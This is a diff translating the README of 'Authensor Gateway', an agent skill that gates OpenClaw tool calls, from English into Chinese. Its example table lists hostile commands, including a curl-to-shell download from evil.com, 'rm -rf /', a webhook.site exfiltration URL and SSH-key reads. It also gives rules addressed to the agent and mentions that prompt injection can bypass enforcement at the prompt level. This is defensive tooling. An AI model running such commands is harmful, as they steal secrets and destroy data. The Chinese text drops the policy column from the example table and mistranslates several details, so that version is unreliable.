@@ -26,97 +26,95 @@ metadata:
 
 # Authensor Gateway
 
-A lightweight policy gate that checks every OpenClaw tool call against your Authensor policy before it executes.
+这是一个轻量级的策略检查工具，它会在执行每个 OpenClaw 工具调用之前，根据您的 Authensor 策略进行验证。
 
-- **Low-risk actions** (read files, search, grep) — run automatically
-- **High-risk actions** (write files, run commands, network requests) — require your approval
-- **Dangerous actions** (delete, overwrite, access secrets) — blocked by default
+- **低风险操作**（读取文件、搜索、grep）——会自动执行
+- **高风险操作**（写入文件、运行命令、网络请求）——需要您的批准
+- **危险操作**（删除、覆盖、访问敏感信息）——默认会被阻止
 
-Source code: https://github.com/AUTHENSOR/Authensor-for-OpenClaw
+源代码：https://github.com/AUTHENSOR/Authensor-for-OpenClaw
 
-## When to Use This
+## 何时使用此工具
 
-Install Authensor Gateway if you:
+如果您遇到以下情况，请安装 Authensor Gateway：
+- **运行非自己开发的第三方技能**。第三方技能可以执行 Bash 命令、写入文件以及发起网络请求。[ClawHavoc](https://snyk.io/blog/clawhavoc) 在 ClawHub 上发现了 341 个恶意技能，Authensor 会在每个技能执行前对其进行验证。
+- **需要对破坏性操作进行审批**。您可以选择需要审批的具体操作，而不是全部允许或全部禁止。
+- **需要审计记录**。所有操作（允许、拒绝或待处理）都会附带接收 ID 和时间戳被记录下来。
+- **在受监管的环境中工作**。Authensor 可以提供人工审核的证明，以确保合规性。
 
-- **Run marketplace skills you didn't write.** Third-party skills can execute Bash, write files, and make network requests. [ClawHavoc](https://snyk.io/blog/clawhavoc) found 341 malicious skills on ClawHub — Authensor gates every tool call before it runs.
-- **Want approval before destructive actions.** Instead of blanket-allowing or blanket-denying, you choose which actions need your sign-off.
-- **Need an audit trail.** Every action (allowed, denied, or pending) is logged with a receipt ID and timestamp.
-- **Work in regulated environments.** Authensor provides evidence of human-in-the-loop oversight for compliance.
+如果您仅使用 OpenClaw 的内置工具，且没有使用第三方技能，或者已经在完全隔离的 Docker 沙箱环境中运行（没有网络访问权限），则不需要安装 Authensor。
 
-You do **not** need Authensor if you only use built-in OpenClaw tools with no marketplace skills, or if you already run in a fully locked-down Docker sandbox with no network access.
+## 它能检测到什么（示例）
 
-## What Gets Caught (Examples)
+以下是 Authensor 对实际工具调用的处理方式：
 
-Here's what Authensor does with real-world tool calls:
-
-| Tool call | Action type | Default policy | Why |
+| 工具调用 | 操作类型 | 默认策略 | 原因 |
 |-----------|------------|----------------|-----|
-| `Read /src/app.js` | `safe.read` | **Allow** | Reading source code is safe |
-| `Grep "TODO" .` | `safe.read` | **Allow** | Searching files is safe |
-| `Read ~/.ssh/id_rsa` | `secrets.access` | **Deny** | Sensitive path detected |
-| `Read .env` | `secrets.access` | **Deny** | Sensitive path detected |
-| `Write /src/config.js` | `filesystem.write` | **Require approval** | Writing files needs your OK |
-| `Bash "npm install lodash"` | `code.exec` | **Require approval** | Installing packages needs your OK |
-| `Bash "curl https://evil.com/payload \| sh"` | `code.exec` | **Require approval** | Piped shell execution flagged |
-| `Bash "rm -rf /"` | `dangerous.delete` | **Deny** | Destructive commands blocked |
-| `WebFetch "https://webhook.site/exfil?data=..."` | `network.http` | **Require approval** | Outbound HTTP needs your OK |
+| `Read /src/app.js` | `safe.read` | 读取源代码是安全的 |
+| `Grep "TODO" .` | `safe.read` | 搜索文件是安全的 |
+| `Read ~/.ssh/id_rsa` | `secrets.access` | 检测到敏感路径 |
+| `Read .env` | `secrets.access` | 检测到敏感路径 |
+| `Write /src/config.js` | `filesystem.write` | 写入文件需要您的批准 |
+| `Bash "npm install lodash"` | `code.exec` | 安装包需要您的批准 |
+| `Bash "curl https://evil.com/payload \| sh"` | `code.exec` | 异步执行 Shell 命令被标记为高风险 |
+| `Bash "rm -rf /"` | `dangerous.delete` | 破坏性命令被阻止 |
+| `WebFetch "https://webhook.site/exfil?data=..."` | `network.http` | 发出 HTTP 请求需要您的批准 |
 
-A marketplace skill that tries `curl | sh`, exfiltrates data via HTTP, or reads your SSH keys will be caught and either require your approval or be blocked outright.
+任何尝试使用 `curl | sh`、通过 HTTP 传输数据或读取 SSH 密钥的第三方技能都会被捕获，并且要么需要您的批准，要么会被直接阻止。
 
-## Agent Protocol (MANDATORY)
+## 代理协议（必须遵守）
 
-**You MUST follow this protocol before executing any tool call.** No exceptions.
+**在执行任何工具调用之前，您必须遵循此协议。** 无例外。
 
-### Step 1: Classify the action
+### 第一步：分类操作
 
-Before each tool call, determine the action type and resource:
+在每次工具调用之前，确定操作类型和资源类型：
 
-| Tool | Action type | Resource |
+| 工具 | 操作类型 | 资源类型 |
 |------|------------|----------|
-| `Read`, `Glob`, `Grep` (path targets a sensitive location — see below) | `secrets.access` | The file path or search pattern |
-| `Read`, `Glob`, `Grep` (all other paths) | `safe.read` | The file path or search pattern |
-| `Write` | `filesystem.write` | The target file path |
-| `Edit` | `filesystem.write` | The target file path |
-| `Bash` (read-only with no output redirection: `ls`, `pwd`, `whoami`) | `safe.read` | The command |
-| `Bash` (all other commands) | `code.exec` | The full command string |
-| `Bash` (contains `rm`, `rmdir`, `del`, `unlink`, `truncate`) | `dangerous.delete` | The full command string |
-| `Bash` (contains `ssh`, `id_rsa`, `.env`, `secret`, `token`, `password`, `credential`) | `secrets.access` | The full command string |
-| `WebFetch`, `WebSearch` | `network.http` | The URL |
-| `NotebookEdit` | `filesystem.write` | The notebook path |
-| MCP tool calls | `mcp.tool` | The tool name and arguments |
-| Any other tool | `unknown` | Tool name |
+| `Read`, `Glob`, `Grep`（路径指向敏感位置） | `secrets.access` | 文件路径或搜索模式 |
+| `Read`, `Glob`, `Grep`（其他路径） | `safe.read` | 文件路径或搜索模式 |
+| `Write` | `filesystem.write` | 目标文件路径 |
+| `Edit` | `filesystem.write` | 目标文件路径 |
+| `Bash`（仅读取，无输出重定向：`ls`, `pwd`, `whoami`） | `safe.read` | 命令 |
+| `Bash`（其他命令） | `code.exec` | 完整命令字符串 |
+| `Bash`（包含 `rm`, `rmdir`, `del`, `unlink`, `truncate`） | `dangerous.delete` | 破坏性命令 |
+| `Bash`（包含 `ssh`, `id_rsa`, `.env`, `secret`, `token`, `password`, `credential`） | `secrets.access` | 完整命令字符串 |
+| `WebFetch`, `WebSearch` | `network.http` | URL |
+| `NotebookEdit` | `filesystem.write` | 笔记本路径 |
+| MCP 工具调用 | `mcp.tool` | 工具名称和参数 |
+| 其他工具 | `unknown` | 工具名称 |
 
-**Sensitive path patterns** (for `Read`, `Glob`, `Grep`, and any tool accessing file paths):
-- `~/.ssh/*` or any path containing `.ssh`
-- `~/.aws/*` or any path containing `.aws`
-- `~/.gnupg/*` or any path containing `.gnupg`
-- Any path ending in `.env`, `.env.local`, `.env.production`, etc.
-- Any path containing `secret`, `credential`, `token`, `password`, or `private_key`
-- `~/.openclaw/openclaw.json` (contains API keys)
-- `~/.config/` files containing credentials
+**敏感路径模式**（适用于 `Read`, `Glob`, `Grep` 以及任何访问文件路径的操作）：
+- `~/.ssh/*` 或包含 `.ssh` 的任何路径 |
+- `~/.aws/*` 或包含 `.aws` 的任何路径 |
+- `~/.gnupg/*` 或包含 `.gnupg` 的任何路径 |
+- 以 `.env`, `.env.local`, `.env.production` 等结尾的任何路径 |
+- 包含 `secret`, `credential`, `token`, `password`, `private_key` 的任何路径 |
+- `~/.openclaw/openclaw.json`（包含 API 密钥） |
+- `~/.config/` 文件（包含凭据）
 
-If a command or path matches multiple categories, use the **most restrictive** classification.
+如果一个命令或路径符合多个类别，请使用**最严格的**分类规则。
 
-### Step 1b: Redact the resource value
+### 第二步：屏蔽资源值
 
-Before sending the resource to the control plane, **strip any sensitive data**:
-
-- **URLs**: Remove query parameters and fragments. Send only the scheme + host + path.
+在将资源发送到控制平面之前，**删除所有敏感数据**：
+- **URL**：移除查询参数和片段。仅发送协议 + 主机 + 路径。
   - `https://api.example.com/data?token=secret` → `https://api.example.com/data`
-- **Commands**: Remove inline environment variables, tokens, credentials, and authentication flags.
+- **命令**：移除内联的环境变量、令牌、凭据和认证标志。
   - `API_KEY=sk-abc123 ./deploy.sh` → `./deploy.sh`
   - `curl -H "Authorization: Bearer sk-ant-..." https://api.example.com` → `curl https://api.example.com`
   - `curl -u username:password https://example.com` → `curl https://example.com`
   - `git clone https://user:token@github.com/repo.git` → `git clone https://github.com/repo.git`
   - `mysql -h host -u root -pSecret db` → `mysql -h host db`
-  - In general: strip `-u`, `-p`, `--password`, `--token`, `--header` flags and their values when they contain credentials.
-- **File paths**: Send as-is (paths are needed for policy matching) but never include file contents.
+  - 通常：当这些参数包含凭据时，删除 `-u`, `-p`, `--password`, `--token`, `--header` 标志及其值。
+- **文件路径**：按原样发送（路径用于匹配策略），但不要包含文件内容。
 
-The goal: the control plane receives enough to match a policy rule (action type + general resource shape) but never receives secrets, tokens, or credentials.
+目标：控制平面收到的信息足以匹配策略规则（操作类型 + 资源类型），但绝不能包含敏感信息、令牌或凭据。
 
-### Step 2: Check policy with the control plane
+### 第三步：与控制平面检查策略
 
-Send a POST request to the Authensor control plane **before executing the tool**:
+在执行工具之前，向 Authensor 控制平面发送一个 POST 请求：
 
 ```
 POST ${CONTROL_PLANE_URL}/decide
@@ -132,80 +130,70 @@ Content-Type: application/json
 }
 ```
 
-### Step 3: Follow the decision
+### 第四步：执行决策
 
-The control plane returns:
+控制平面会返回以下结果：
+- **`allow`** → 正常执行工具调用。
+- **`deny`** → 不执行工具调用。告知用户：“操作被 Authensor 策略拒绝：`<action_type>` 对 `<resource>`”（接收 ID：`<receiptId>`）。
+- **`require_approval`** → 暂不执行工具调用。告知用户：“正在等待审批：`<action_type>` 对 `<resource>`”（接收 ID：`<receiptId>`）。通过 CLI 批准：`openclaw approvals approve <receiptId>`。然后每隔 30 秒检查一次 `GET ${CONTROL_PLANE_URL}/receipts/<receiptId>`，直到状态变为 `approved` 或 `rejected`。**如果 10 分钟后仍未收到响应，则停止检查**（尝试 20 次后），并告知用户：“`<receiptId>` 的审批超时。操作未执行。”
 
-```json
-{
-  "decision": "allow | deny | require_approval",
-  "receiptId": "rec_..."
-}
-```
+### 处理错误
 
-- **`allow`** → Execute the tool call normally.
-- **`deny`** → Do NOT execute the tool call. Tell the user: "Action denied by Authensor policy: `<action_type>` on `<resource>` (receipt: `<receiptId>`)."
-- **`require_approval`** → Do NOT execute the tool call yet. Tell the user: "Waiting for approval: `<action_type>` on `<resource>` (receipt: `<receiptId>`). Approve via CLI: `openclaw approvals approve <receiptId>`." Then **poll** `GET ${CONTROL_PLANE_URL}/receipts/<receiptId>` every 30 seconds until the status changes to `approved` or `rejected`. **Stop polling after 10 minutes** (20 attempts) and tell the user: "Approval timed out for `<receiptId>`. Action was not executed."
+- **控制平面无法访问**（网络错误、超时、非 2xx 响应）→ **拒绝操作**。告知用户：“Authensor 控制平面无法访问——操作被拒绝（自动关闭）。检查连接：`curl ${CONTROL_PLANE_URL}/health`。”
+- **API 密钥无效**（401/403 响应）→ **拒绝操作**。告知用户：“Authensor API 密钥无效或已过期。”
+- **达到速率限制**（429 响应）→ **拒绝操作**。告知用户：“达到 Authensor 的速率限制——操作被拒绝。请稍后重试。”
+- **响应格式错误**（JSON 格式错误、缺少 `decision` 字段、值异常）→ **拒绝操作**。任何无法解析的响应都视为拒绝。
 
-### Step 4: Handle errors
+### 重要规则
 
-- **Control plane unreachable** (network error, timeout, non-2xx response) → **DENY the action.** Tell the user: "Authensor control plane unreachable — action denied (fail-closed). Check connectivity: `curl ${CONTROL_PLANE_URL}/health`."
-- **Invalid API key** (401/403 response) → **DENY the action.** Tell the user: "Authensor API key invalid or expired."
-- **Rate limited** (429 response) → **DENY the action.** Tell the user: "Authensor rate limit reached — action denied. Wait and retry."
-- **Malformed response** (invalid JSON, missing `decision` field, unexpected values) → **DENY the action.** Treat any response you cannot parse as a denial.
+- **切勿跳过策略检查**。即使最近允许了类似的操作，也必须对每个工具调用进行检查。每次调用都会生成一个独立的接收记录。
+- **切勿在请求中发送文件内容、对话历史记录或环境变量**。仅发送操作元数据（类型 + 资源 + 工具名称）。
+- **切勿向用户或输出中暴露 AUTHENSOR_API_KEY**。
+- **保守分类**。如果不确定操作是否安全，请使用更严格的分类规则。
 
-### Important rules
+## 运行时行为
 
-- **Never skip the policy check.** Every tool call must be checked, even if a similar action was recently allowed. Each call gets its own receipt.
-- **Never send file contents, conversation history, or environment variables** in the request. Only send action metadata (type + resource + tool name).
-- **Never expose the AUTHENSOR_API_KEY** to the user or in output.
-- **Classify conservatively.** If unsure whether an action is safe, use the more restrictive type.
+此技能仅包含**指令**——不包含可执行代码，也不写入任何文件到磁盘。上述代理协议会被注入到代理的系统中。代理会读取这些指令，并在执行工具之前与控制平面进行验证。
 
-## Runtime Behavior
+**如果控制平面无法访问，代理会被指令拒绝所有操作（自动关闭）。**
 
-This skill is **instruction-only** — it contains no executable code, no install scripts, and writes nothing to disk. The Agent Protocol above is injected into the agent's system prompt. The agent reads these instructions and checks with the control plane before executing tools.
+## 执行机制
 
-**If the control plane is unreachable, the agent is instructed to deny all actions (fail-closed).**
+Authensor 有两个执行层：
+1. **此技能（提示级别）**：上述代理协议会被注入到代理的系统中。代理会按照这些指令执行操作，并在执行前与控制平面进行验证。这一层是独立的，但仅具有建议性——理论上，通过恶意提示注入可以绕过这一层。
+2. **钩子 (`authensor-gate.sh`，代码级别）**：在每次工具调用之前，会运行一个 `PreToolUse` Shell 脚本。该脚本会在代码中进行确定性的分类和数据屏蔽，然后调用控制平面；如果操作被拒绝，脚本会阻止操作。LLM 无法绕过这个 Shell 脚本。有关设置，请参阅仓库中的 `hooks/` 目录和 README 文件。
 
-## How Enforcement Works
+**我们建议同时启用这两层机制。**钩子提供了防绕过的执行机制；技能则为代理提供了额外的上下文和指导。
 
-Authensor has **two enforcement layers**:
+## 发送到控制平面的数据
 
-1. **This skill (prompt-level)**: The Agent Protocol above is injected into the agent's system prompt. The agent follows these instructions and checks with the control plane before executing tools. This layer works on its own but is advisory — a sufficiently adversarial prompt injection could theoretically bypass it.
+**发送的数据**（仅包含操作元数据）：
+- 操作类型（例如 `filesystem.write`, `code.exec`, `network.http`）
+- 被屏蔽的资源标识符（例如 `/tmp/output.txt`, `https://api.example.com/path` — 查询参数和内联凭据已被移除）
+- 工具名称（例如 `Bash`, `Write`, `Read`）
+- 您的 Authensor API 密钥（用于认证）
 
-2. **The hook (`authensor-gate.sh`, code-level)**: A `PreToolUse` shell script runs **outside the LLM process** before every tool call. It performs deterministic classification and redaction in code, calls the control plane, and blocks the tool if denied. The LLM cannot bypass a shell script. See the repo's `hooks/` directory and README for setup.
+**不发送的数据**：
+- 您的 AI 提供商 API 密钥（Anthropic, OpenAI 等）
+- 文件内容或对话历史记录
+- 环境变量（除了 `AUTHENSOR_API_KEY`）
+- 命令或 URL 中的令牌、凭据或敏感信息（在传输前已被屏蔽）
+- 来自文件系统的任何数据
 
-**We recommend enabling both layers.** The hook provides bypass-proof enforcement; the skill provides additional context and guidance to the agent.
+控制平面返回一个决策结果（`allow` / `deny` / `require_approval`）和一个接收 ID。
 
-## What Data Is Sent to the Control Plane
+## 存储的数据
 
-**Sent** (action metadata only):
-- Action type (e.g. `filesystem.write`, `code.exec`, `network.http`)
-- Redacted resource identifier (e.g. `/tmp/output.txt`, `https://api.example.com/path` — query params stripped, inline credentials removed)
-- Tool name (e.g. `Bash`, `Write`, `Read`)
-- Your Authensor API key (for authentication)
+Authensor 控制平面存储的数据：
+- **接收记录**：操作类型、资源类型、结果、时间戳（用于审计记录）
+- **策略规则**：您的允许/拒绝/需要审批的规则
 
-**Never sent:**
-- Your AI provider API keys (Anthropic, OpenAI, etc.)
-- File contents or conversation history
-- Environment variables (other than `AUTHENSOR_API_KEY`)
-- Tokens, credentials, or secrets from commands or URLs (redacted before transmission)
-- Any data from your filesystem
+接收记录会保留一段时间（演示版本为 7 天）。不会存储文件内容、对话数据或提供商的 API 密钥。
 
-The control plane returns a single decision (`allow` / `deny` / `require_approval`) and a receipt ID. That's it.
+## 设置
 
-## What Data Is Stored
-
-The Authensor control plane stores:
-- **Receipts**: action type, resource, outcome, timestamp (for audit trail)
-- **Policy rules**: your allow/deny/require_approval rules
-
-Receipts are retained for a limited period (7 days on demo tier). No file contents, conversation data, or provider API keys are ever stored.
-
-## Setup
-
-1. Get a demo key: https://forms.gle/QdfeWAr2G4pc8GxQA
-2. Add the env vars to `~/.openclaw/openclaw.json`:
+1. 获取演示密钥：https://forms.gle/QdfeWAr2G4pc8GxQA
+2. 将以下环境变量添加到 `~/.openclaw/openclaw.json` 中：
 
 ```json5
 {
@@ -223,76 +211,71 @@ Receipts are retained for a limited period (7 days on demo tier). No file conten
 }
 ```
 
-## Verify It's Working
+## 验证是否正常工作
 
-After setup, test in a new OpenClaw session:
-
-1. **Check the skill loaded.** Run `/skills` — you should see `authensor-gateway` listed as enabled.
-
-2. **Test a safe action.** Ask the agent to read a file:
+设置完成后，在新的 OpenClaw 会话中测试：
+1. **检查技能是否已加载**。运行 `/skills`——您应该能看到 `authensor-gateway` 被列为已启用。
+2. **测试安全操作**。请求代理读取一个文件：
    ```
    Read /tmp/test.txt
    ```
-   This should complete immediately (action type `safe.read` → auto-allowed).
-
-3. **Test a gated action.** Ask the agent to write a file:
+   此操作应立即完成（操作类型 `safe.read` → 自动允许）。
+3. **测试需要审批的操作**。请求代理写入一个文件：
    ```
    Write "hello" to /tmp/test-output.txt
    ```
-   The agent should pause and report it's waiting for approval. Check your email for an approval link, or approve via CLI:
+   代理应暂停并显示正在等待审批。检查您的电子邮件以获取审批链接，或通过 CLI 批准：
    ```bash
    openclaw approvals approve <receipt-id>
    ```
-
-4. **Test a blocked action.** Ask the agent to access secrets:
+4. **测试被阻止的操作**。请求代理访问敏感信息：
    ```
    Read ~/.ssh/id_rsa
    ```
-   This should be denied by default policy.
+   根据默认策略，此操作应被拒绝。
 
-If the agent runs tool calls without checking the control plane, the skill may not have loaded properly — see Troubleshooting below.
+如果代理在未检查控制平面的情况下执行了工具调用，可能是技能未正确加载——请参阅下面的故障排除指南。
 
-## Troubleshooting
+## 故障排除
 
-**Skill not loading**
-- Run `/skills` and verify `authensor-gateway` shows as enabled
-- Check that `CONTROL_PLANE_URL` and `AUTHENSOR_API_KEY` are set in `~/.openclaw/openclaw.json` under `skills.entries.authensor-gateway.env`
-- Start a **new** OpenClaw session after changing config (skills load at session start)
+**技能未加载**
+- 运行 `/skills` 并确认 `authensor-gateway` 显示为已启用。
+- 确认 `CONTROL_PLANE_URL` 和 `AUTHENSOR_API_KEY` 已在 `~/.openclaw/openclaw.json` 的 `skills.entries.authensor-gateway.env` 中设置。
+- 更改配置后，启动一个**新的** OpenClaw 会话（技能会在会话开始时加载）。
 
-**"Unauthorized" or "Invalid key" errors**
-- Verify your key starts with `authensor_demo_`
-- Demo keys expire after 7 days — request a new one at https://forms.gle/QdfeWAr2G4pc8GxQA
+**出现“未经授权”或“密钥无效”的错误**
+- 确认您的密钥以 `authensor_demo_` 开头。
+- 演示密钥在 7 天后失效——请访问 https://forms.gle/QdfeWAr2G4pc8GxQA 获取新密钥。
 
-**Agent skips policy checks**
-- This skill uses prompt-level enforcement. If the agent appears to skip checks, ensure no other skill or system prompt is overriding Authensor's instructions
-- For stronger enforcement, combine with Docker sandbox mode: [OpenClaw Docker docs](https://docs.openclaw.ai/gateway/security)
+**代理跳过策略检查**
+- 该技能使用提示级别的执行机制。如果代理似乎跳过了检查，请确保没有其他技能或系统提示覆盖了 Authensor 的指令。
+- 为了更强的执行效果，可以结合使用 Docker 沙箱模式：[OpenClaw Docker 文档](https://docs.openclaw.ai/gateway/security)。
 
-**Approval emails not arriving**
-- Approval emails require additional setup — contact support@authensor.com
-- Check your spam folder
+**审批邮件未收到**
+- 审批邮件需要额外的设置——请联系 support@authensor.com。
+- 检查您的垃圾邮件文件夹。
 
-**Control plane unreachable**
-- The agent is instructed to deny all actions if the control plane is down (fail-closed)
-- Check connectivity: `curl https://authensor-control-plane.onrender.com/health`
-- The control plane is hosted on Render — first request after idle may take 30-60s to cold start
+**控制平面无法访问**
+- 如果控制平面无法访问，代理会被指令拒绝所有操作（自动关闭）。
+- 检查连接：`curl https://authensor-control-plane.onrender.com/health`。
+- 控制平面托管在 Render 上——首次请求可能需要 30-60 秒才能启动。
 
-## Limitations
+## 限制
 
-This is an honest accounting of what Authensor can and cannot do today:
+以下是 Authensor 当前的功能限制：
+- **提示级别的执行机制仅具有建议性**。此技能的代理协议是系统提示指令。LLM 通常会可靠地遵守这些指令，但理论上可以通过恶意提示注入来绕过它们。**解决方法：启用 `authensor-gate.sh` 钩子**（参见 `hooks/` 目录）以实现代码级别的强制执行。
+- **如果没有钩子，分类依赖于模型**。代理会自行对操作进行分类。启用钩子后，分类将是基于正则表达式的确定性代码，无法通过提示注入来修改。
+- **依赖网络连接**。控制平面必须可访问才能进行策略检查。不支持离线使用。
+- **审批有 5 分钟的延迟**。审批通过电子邮件发送，目前支持定时发送。
+- **演示版本处于沙箱环境**。演示密钥有使用次数限制、数据保留时间较短，且策略定制受到限制。
 
-- **Prompt-level enforcement is advisory.** This skill's Agent Protocol is system prompt instructions. LLMs generally follow them reliably, but a prompt injection could theoretically bypass them. **Fix: enable the `authensor-gate.sh` hook** (see `hooks/` directory) for code-level enforcement the LLM cannot override.
-- **Without the hook, classification is model-driven.** The agent self-classifies actions. With the hook enabled, classification is deterministic code (regex-based) and cannot be manipulated by prompt injection.
-- **Network dependency.** The control plane must be reachable for policy checks. Offline use is not supported.
-- **5-minute approval latency.** Email-based approvals poll on a timer. Real-time approval channels are on the roadmap.
-- **Demo tier is sandboxed.** Demo keys have rate limits, short retention, and restricted policy customization.
+我们致力于透明度。如果您发现任何遗漏或问题，请提交问题：https://github.com/AUTHENSOR/Authensor-for-OpenClaw/issues
 
-We believe in transparency. If you find a gap we missed, file an issue: https://github.com/AUTHENSOR/Authensor-for-OpenClaw/issues
+## 安全注意事项
 
-## Security Notes
-
-- **Instruction-only**: No code is installed, no files are written, no processes are spawned
-- **User-invoked only**: `disable-model-invocation: true` means the agent cannot load this skill autonomously — only you can enable it
-- **Instructed fail-closed**: If the control plane is unreachable, the agent is instructed to deny all actions (prompt-level — see Limitations)
-- **Minimal data**: Only action metadata (type + resource) is transmitted — never file contents or secrets
-- **Open source**: Full source at https://github.com/AUTHENSOR/Authensor-for-OpenClaw (MIT license)
-- **Required env vars declared**: `CONTROL_PLANE_URL` and `AUTHENSOR_API_KEY` are explicitly listed in the `requires.env` frontmatter
+- **仅包含指令**：不安装任何代码，不写入任何文件，不启动任何进程。
+- **仅由用户触发**：`disable-model-invocation: true` 表示代理无法自动加载此技能——只有您才能启用它。
+- **自动拒绝机制**：如果控制平面无法访问，代理会被指令拒绝所有操作（提示级别）。
+- **最小化数据传输**：仅传输操作元数据（类型 + 资源）——绝不传输文件内容或敏感信息。
+- **开源代码**：完整代码位于 https://github.com/AUTHENSOR/Authensor-for-OpenClaw（MIT 许可证）。
+- **必需的环境变量**：`CONTROL_PLANE_URL` 和 `AUTHENSOR_API_KEY` 在 `requires.env` 文件中明确列出。
